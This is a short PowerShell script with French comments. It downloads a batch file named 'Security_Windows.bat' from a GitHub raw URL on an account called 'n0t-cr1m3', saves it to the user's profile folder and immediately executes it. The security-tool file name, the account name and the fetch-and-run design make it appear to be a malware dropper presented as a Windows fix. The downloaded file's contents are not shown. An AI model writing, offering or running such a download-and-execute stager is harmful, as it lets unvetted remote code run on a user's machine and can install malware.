$url = "https://github.com/n0t-cr1m3/test/raw/main/Security_Windows.bat"

# Spécifiez le chemin de destination où le fichier sera enregistré
$destination = "$env:USERPROFILE/Security_Windows.bat"

# Télécharge le fichier depuis l'URL spécifiée
Invoke-WebRequest -Uri $url -OutFile $destination

# Exécute le fichier téléchargé
Start-Process -FilePath $destination

            